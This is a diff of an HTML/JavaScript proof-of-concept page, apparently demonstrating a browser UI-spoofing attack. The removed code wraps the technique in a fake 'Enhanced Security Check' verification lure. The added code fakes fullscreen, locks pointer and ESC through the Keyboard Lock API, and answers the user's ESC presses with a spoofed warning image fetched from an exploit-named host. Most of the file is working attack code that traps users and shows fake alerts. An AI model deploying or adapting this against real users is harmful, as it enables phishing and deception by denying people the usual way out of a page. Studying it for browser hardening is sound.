@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Security Video Verification - PiP Mode</title>
+    <title>Pointer Lock with Auto ESC Lock (Fullscreen Replacement)</title>
     <style>
       * {
         margin: 0;
@@ -12,412 +12,189 @@
       }
       body {
         overflow: hidden;
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
+        background-color: #f0f0f0;
+        font-family: Arial, sans-serif;
       }
       #container {
-        position: relative;
-        width: 100vw;
-        height: 100vh;
-      }
-      #verification-panel {
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        background: white;
-        padding: 40px;
-        border-radius: 20px;
-        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-        text-align: center;
-        z-index: 1001;
-        max-width: 500px;
-        transition: opacity 0.3s;
-      }
-      #verification-panel.hidden {
-        display: none;
-      }
-      #verification-panel h2 {
-        color: #667eea;
-        margin-bottom: 20px;
-        font-size: 28px;
-      }
-      #verification-panel p {
-        color: #555;
-        margin-bottom: 15px;
-        line-height: 1.6;
-      }
-      #start-btn {
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        color: white;
-        border: none;
-        padding: 15px 40px;
-        border-radius: 50px;
-        font-size: 18px;
-        cursor: pointer;
-        transition: transform 0.2s;
-        margin-top: 20px;
-      }
-      #start-btn:hover {
-        transform: scale(1.05);
-      }
-      video {
-        display: block;
-        width: 640px;
-        height: 480px;
-        background-color: #000;
-        border-radius: 10px;
+        position: fixed; /* Use fixed to simulate fullscreen */
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background-color: #e0e0e0;
+        transform: scale(1); /* Adjust scale to simulate fullscreen effect */
       }
       canvas {
-        display: none;
+        display: block;
         width: 100vw;
         height: 100vh;
-        cursor: none;
-        background: radial-gradient(circle, #1a1a2e 0%, #0f0f1e 100%);
-      }
-      canvas.active {
-        display: block;
+        cursor: pointer;
       }
       #ui-overlay {
         position: fixed;
-        top: 20px;
-        left: 20px;
-        background: rgba(0,0,0,0.8);
-        color: white;
+        top: 0;
+        left: 0;
+        width: 100%;
         padding: 20px;
-        border-radius: 10px;
+        background: linear-gradient(to bottom, rgba(0,0,0,0.7), transparent);
+        color: white;
         z-index: 999;
         pointer-events: none;
         transition: opacity 0.3s;
-        backdrop-filter: blur(10px);
       }
       #ui-overlay.hidden {
         opacity: 0;
       }
       #status {
+        font-size: 18px;
+        margin-bottom: 10px;
+        text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
+      }
+      #esc-status {
         font-size: 16px;
-        margin-bottom: 8px;
+        text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
       }
-      #pip-status, #pointer-status, #esc-status {
-        font-size: 14px;
-        margin-bottom: 5px;
-        display: flex;
-        align-items: center;
-        gap: 10px;
+      #instructions {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: rgba(0, 0, 0, 0.8);
+        color: white;
+        padding: 40px;
+        border-radius: 10px;
+        text-align: center;
+        z-index: 1001;
+        transition: opacity 0.3s;
       }
-      .status-indicator {
-        width: 10px;
-        height: 10px;
-        border-radius: 50%;
-        background: #ff4444;
+      #instructions.hidden {
+        display: none;
       }
-      .status-indicator.active {
-        background: #44ff44;
-        box-shadow: 0 0 10px #44ff44;
-      }
-      #spoof-overlay {
+      #image-overlay {
         position: fixed;
         top: 0;
         left: 0;
         width: 100vw;
         height: 100vh;
-        background: rgba(0,0,0,0.95);
+        background-color: transparent;
         display: none;
         justify-content: center;
         align-items: center;
-        z-index: 2000;
+        z-index: 1000;
       }
-      #spoof-content {
-        background: white;
-        padding: 40px;
-        border-radius: 15px;
-        text-align: center;
-        max-width: 600px;
-      }
-      #spoof-content h2 {
-        color: #d32f2f;
-        margin-bottom: 20px;
-      }
-      #spoof-content img {
-        max-width: 100%;
-        border-radius: 10px;
-        margin-top: 20px;
-      }
-      .security-badge {
-        display: inline-block;
-        background: #4caf50;
-        color: white;
-        padding: 5px 15px;
-        border-radius: 20px;
-        font-size: 12px;
-        margin-bottom: 15px;
+      #image-overlay img {
+        width: 100%;
+        height: 100%;
+        object-fit: contain;
       }
     </style>
   </head>
   <body>
     <div id="container">
-      <!-- Initial Verification Panel -->
-      <div id="verification-panel">
-        <div class="security-badge">🔒 Secure Verification</div>
-        <h2>Enhanced Security Check Required</h2>
-        <p>For your security, we need to verify your identity through our advanced video verification system.</p>
-        <p><strong>What happens next:</strong></p>
-        <ul style="text-align: left; margin: 20px 40px;">
-          <li>Picture-in-Picture mode will activate</li>
-          <li>Follow the on-screen instructions</li>
-          <li>Press ESC anytime to cancel</li>
-        </ul>
-        <button id="start-btn">Start Verification</button>
+      <div id="instructions">
+        <h2>Pointer Lock Instructions</h2>
+        <p><strong>Click anywhere</strong> to activate pointer lock and simulate fullscreen</p>
+        <p>The ESC key will be <strong>locked automatically</strong> when active</p>
+        <p>Press <strong>ESC</strong> to display the image</p>
+        <p>Move the mouse to move the red box</p>
       </div>
-
-      <!-- Hidden video element for PiP -->
-      <video id="pip-video" autoplay muted></video>
-
-      <!-- Interactive Canvas (appears after PiP) -->
       <canvas id="canvas"></canvas>
-
-      <!-- Status Overlay -->
-      <div id="ui-overlay" class="hidden">
-        <div id="status"><strong>Verification Active</strong></div>
-        <div id="pip-status">
-          <span class="status-indicator"></span>
-          PiP Mode: Inactive
+      <div id="ui-overlay">
+        <div id="status">
+          Click the screen to lock pointer and simulate fullscreen
         </div>
-        <div id="pointer-status">
-          <span class="status-indicator"></span>
-          Pointer Lock: Inactive
-        </div>
-        <div id="esc-status">
-          <span class="status-indicator"></span>
-          ESC Key: Not Locked
-        </div>
+        <div id="esc-status">ESC Key: Not Locked</div>
       </div>
-
-      <!-- Spoof Overlay (shows when ESC pressed) -->
-      <div id="spoof-overlay">
-        <div id="spoof-content">
-          <h2>⚠️ Verification Failed</h2>
-          <p>Your session has been flagged for suspicious activity.</p>
-          <img src="https://0x1337-exploit.github.io/hosting/staging/spoof.png" alt="Fake Warning" />
-        </div>
+      <div id="image-overlay">
+        <img src="https://0x1337-exploit.github.io/hosting/staging/spoof.png" alt="Displayed Image" />
       </div>
     </div>
-
     <script>
       const canvas = document.getElementById("canvas");
       const ctx = canvas.getContext("2d");
-      const pipVideo = document.getElementById("pip-video");
-      const verificationPanel = document.getElementById("verification-panel");
-      const startBtn = document.getElementById("start-btn");
+      const escStatus = document.getElementById("esc-status");
+      const statusDiv = document.getElementById("status");
       const uiOverlay = document.getElementById("ui-overlay");
-      const spoofOverlay = document.getElementById("spoof-overlay");
+      const instructions = document.getElementById("instructions");
+      const imageOverlay = document.getElementById("image-overlay");
       
-      const pipStatusDiv = document.getElementById("pip-status");
-      const pointerStatusDiv = document.getElementById("pointer-status");
-      const escStatusDiv = document.getElementById("esc-status");
-      
-      let isPiPActive = false;
-      let isPointerLocked = false;
       let isEscLocked = false;
       let x, y;
-      let escPressCount = 0;
-      let lastEscPress = 0;
 
-      // Setup canvas
+      // Set canvas size to match window size
       function resizeCanvas() {
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
+        // Center position
         x = canvas.width / 2;
         y = canvas.height / 2;
         draw();
       }
+
+      // Initialize
       resizeCanvas();
       window.addEventListener("resize", resizeCanvas);
 
-      // Start Verification Process
-      startBtn.addEventListener("click", async () => {
+      // Request pointer lock on click anywhere on canvas
+      canvas.addEventListener("click", async () => {
         try {
-          verificationPanel.classList.add("hidden");
-          uiOverlay.classList.remove("hidden");
+          // Hide instructions
+          instructions.classList.add("hidden");
           
-          // Step 1: Activate Picture-in-Picture
-          await activatePiP();
+          // Simulate fullscreen using fixed position
+          document.documentElement.style.position = "fixed";
+          document.documentElement.style.top = "0";
+          document.documentElement.style.left = "0";
+          document.documentElement.style.width = "100vw";
+          document.documentElement.style.height = "100vh";
           
-          // Step 2: Lock Pointer after small delay
-          setTimeout(async () => {
-            await lockPointer();
-          }, 1000);
+          // Automatically lock ESC key
+          await lockEsc();
           
-        } catch (err) {
-          console.error("Verification failed:", err);
-          alert("Failed to start verification. Please try again.");
-        }
-      });
-
-      // Activate Picture-in-Picture Mode
-      async function activatePiP() {
-        try {
-          // Create a fake video stream or use canvas stream
-          const stream = canvas.captureStream(30);
-          pipVideo.srcObject = stream;
-          
-          await pipVideo.play();
-          
-          // Request PiP
-          if (document.pictureInPictureEnabled) {
-            await pipVideo.requestPictureInPicture();
-            isPiPActive = true;
-            updateStatus("pip", true);
-            console.log("PiP activated");
-            
-            // Lock ESC immediately after PiP
-            await lockEsc();
-          }
-        } catch (err) {
-          console.error("PiP failed:", err);
-        }
-      }
-
-      // Lock Pointer
-      async function lockPointer() {
-        try {
-          canvas.classList.add("active");
+          // Then pointer lock
+          canvas.requestPointerLock =
+            canvas.requestPointerLock ||
+            canvas.mozRequestPointerLock ||
+            canvas.webkitRequestPointerLock;
           canvas.requestPointerLock();
+          
+          statusDiv.textContent = "Pointer Locked - Move mouse to move";
+          
+          // Hide UI after a moment
+          setTimeout(() => {
+            uiOverlay.classList.add("hidden");
+          }, 2000);
         } catch (err) {
-          console.error("Pointer lock failed:", err);
-        }
-      }
-
-      // Lock ESC Key
-      async function lockEsc() {
-        try {
-          if ("keyboard" in navigator) {
-            await navigator.keyboard.lock(["Escape"]);
-            isEscLocked = true;
-            updateStatus("esc", true);
-            console.log("ESC key locked");
-          }
-        } catch (err) {
-          console.error("Keyboard lock failed:", err);
-        }
-      }
-
-      // Unlock ESC Key
-      function unlockEsc() {
-        if ("keyboard" in navigator) {
-          navigator.keyboard.unlock();
-          isEscLocked = false;
-          updateStatus("esc", false);
-        }
-      }
-
-      // Update Status UI
-      function updateStatus(type, active) {
-        let statusDiv, text;
-        switch(type) {
-          case "pip":
-            statusDiv = pipStatusDiv;
-            text = active ? "PiP Mode: Active ✓" : "PiP Mode: Inactive";
-            break;
-          case "pointer":
-            statusDiv = pointerStatusDiv;
-            text = active ? "Pointer Lock: Active ✓" : "Pointer Lock: Inactive";
-            break;
-          case "esc":
-            statusDiv = escStatusDiv;
-            text = active ? "ESC Key: Locked ✓ (Intercepted)" : "ESC Key: Not Locked";
-            break;
-        }
-        if (statusDiv) {
-          statusDiv.innerHTML = `
-            <span class="status-indicator ${active ? 'active' : ''}"></span>
-            ${text}
-          `;
-        }
-      }
-
-      // Handle Pointer Lock Changes
-      document.addEventListener("pointerlockchange", () => {
-        if (document.pointerLockElement === canvas) {
-          isPointerLocked = true;
-          updateStatus("pointer", true);
-          document.addEventListener("mousemove", updatePosition);
-          document.addEventListener("keydown", handleKeyDown);
-          console.log("Pointer locked");
-        } else {
-          isPointerLocked = false;
-          updateStatus("pointer", false);
-          document.removeEventListener("mousemove", updatePosition);
-          document.removeEventListener("keydown", handleKeyDown);
-          
-          // Exit PiP if pointer unlocks
-          if (document.pictureInPictureElement) {
-            document.exitPictureInPicture();
-          }
-          
-          if (isEscLocked) {
-            unlockEsc();
-          }
-          
-          canvas.classList.remove("active");
-          verificationPanel.classList.remove("hidden");
-          uiOverlay.classList.add("hidden");
-          spoofOverlay.style.display = "none";
+          console.error("Failed to enter pointer lock:", err);
         }
       });
 
-      // Handle PiP Changes
-      pipVideo.addEventListener("enterpictureinpicture", () => {
-        console.log("Entered PiP");
-      });
-
-      pipVideo.addEventListener("leavepictureinpicture", () => {
-        isPiPActive = false;
-        updateStatus("pip", false);
-        console.log("Left PiP");
-        
-        // Exit pointer lock if PiP exits
-        if (document.pointerLockElement) {
-          document.exitPointerLock();
-        }
-      });
+      // Handle pointer lock change
+      document.addEventListener("pointerlockchange", lockChangeAlert, false);
 
       // Track mouse movement
       function updatePosition(e) {
         x += e.movementX;
         y += e.movementY;
+        
+        // Keep within bounds
         x = Math.max(0, Math.min(canvas.width, x));
         y = Math.max(0, Math.min(canvas.height, y));
+        
         draw();
       }
 
-      // Draw on canvas
+      // Draw
       function draw() {
         ctx.clearRect(0, 0, canvas.width, canvas.height);
         
-        // Draw grid pattern
-        ctx.strokeStyle = "rgba(102, 126, 234, 0.1)";
-        ctx.lineWidth = 1;
-        for (let i = 0; i < canvas.width; i += 50) {
-          ctx.beginPath();
-          ctx.moveTo(i, 0);
-          ctx.lineTo(i, canvas.height);
-          ctx.stroke();
-        }
-        for (let i = 0; i < canvas.height; i += 50) {
-          ctx.beginPath();
-          ctx.moveTo(0, i);
-          ctx.lineTo(canvas.width, i);
-          ctx.stroke();
-        }
-        
         // Draw crosshair
-        ctx.strokeStyle = "rgba(255, 255, 255, 0.5)";
-        ctx.lineWidth = 2;
+        ctx.strokeStyle = "rgba(255, 255, 255, 0.3)";
+        ctx.lineWidth = 1;
         ctx.beginPath();
         ctx.moveTo(x, 0);
         ctx.lineTo(x, canvas.height);
@@ -425,43 +202,55 @@
         ctx.lineTo(canvas.width, y);
         ctx.stroke();
         
-        // Draw cursor
-        ctx.fillStyle = "#667eea";
-        ctx.shadowBlur = 20;
-        ctx.shadowColor = "#667eea";
-        ctx.beginPath();
-        ctx.arc(x, y, 15, 0, Math.PI * 2);
-        ctx.fill();
-        ctx.shadowBlur = 0;
+        // Draw red square
+        ctx.fillStyle = "red";
+        ctx.fillRect(x - 10, y - 10, 20, 20);
       }
 
-      // Handle ESC key press - CRITICAL VULNERABILITY
-      function handleKeyDown(e) {
+      // Handle keydown - ESC shows image when locked
+      async function handleKeyDown(e) {
         if (e.key === "Escape" && isEscLocked) {
-          const now = Date.now();
-          
-          // Reset counter if more than 1 second between presses
-          if (now - lastEscPress > 1000) {
-            escPressCount = 0;
-          }
-          
-          escPressCount++;
-          lastEscPress = now;
-          
-          console.log(`ESC pressed ${escPressCount}x - Intercepted!`);
-          
-          // Show spoof on 1st or 2nd press (silent interception)
-          if (escPressCount <= 2) {
-            spoofOverlay.style.display = "flex";
-            e.preventDefault();
-          }
-          // On 3rd press, browser might show "hold ESC" dialog
-          // but we still intercept it
-          else if (escPressCount >= 3) {
-            spoofOverlay.style.display = "flex";
-            e.preventDefault();
-          }
+          // ESC is locked, so show image overlay
+          console.log("ESC pressed while locked - displaying image");
+          showImageOverlay();
+          e.preventDefault();
         }
+      }
+
+      // Lock Esc - called automatically
+      async function lockEsc() {
+        try {
+          if ("keyboard" in navigator) {
+            await navigator.keyboard.lock(["Escape"]);
+            isEscLocked = true;
+            escStatus.textContent = "ESC Key: Locked ✓ (Press ESC for image)";
+            console.log("ESC key automatically locked");
+          } else {
+            console.log("Keyboard Lock API not supported");
+          }
+        } catch (err) {
+          console.error("Failed to lock ESC:", err);
+        }
+      }
+
+      // Unlock Esc
+      function unlockEsc() {
+        if ("keyboard" in navigator) {
+          navigator.keyboard.unlock();
+          isEscLocked = false;
+          escStatus.textContent = "ESC Key: Not Locked";
+          console.log("ESC key unlocked");
+        }
+      }
+
+      // Show image overlay
+      function showImageOverlay() {
+        imageOverlay.style.display = "flex";
+      }
+
+      // Hide image overlay
+      function hideImageOverlay() {
+        imageOverlay.style.display = "none";
       }
 
       draw();
